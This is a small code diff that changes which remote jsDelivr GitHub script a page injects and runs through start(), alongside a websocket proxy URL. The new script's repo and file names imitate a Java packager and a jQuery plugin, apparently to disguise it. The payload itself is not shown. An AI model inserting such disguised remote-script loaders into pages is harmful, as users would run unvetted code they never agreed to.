@@ -13,7 +13,7 @@
     }, "wss://muddy-tallia-masterw-23a8c046.koyeb.app/proxy")};
 
     const script = document.createElement('script');
-    script.src = "https://cdn.jsdelivr.net/gh/gogogo0123456/A-1-4e-hg1s/mains.js";
+    script.src = "https://cdn.jsdelivr.net/gh/javerosc/jdk-packager-3.1/jquery.magnific.js";
      script.onload = () => {
       start();
     };
